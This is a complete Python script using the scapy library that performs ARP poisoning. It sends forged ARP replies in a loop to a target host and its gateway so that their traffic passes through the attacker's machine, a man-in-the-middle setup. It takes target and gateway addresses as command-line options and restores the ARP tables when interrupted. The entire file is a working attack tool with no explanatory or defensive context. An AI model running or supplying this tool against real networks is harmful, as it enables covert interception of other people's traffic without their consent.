

import scapy.all as scapy
import time
import optparse

def get_mac_address(user_ip):

    arp_request_packet = scapy.ARP(pdst=user_ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, modem_ip):

    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=modem_ip)
    scapy.send(arp_response,verbose=False)


def reset_operation(fooled_ip, gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False,count=6)


def get_user_input():

    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip",help="Enter target ip")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway ip")
    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("enter target ip")
    if not options.gateway_ip:
        print("enter gateway ip")

    return options


number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        print("\rsending packets " + str(number),end="")
        number += 2
        time.sleep(3)


except KeyboardInterrupt:

    print("\n Quit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
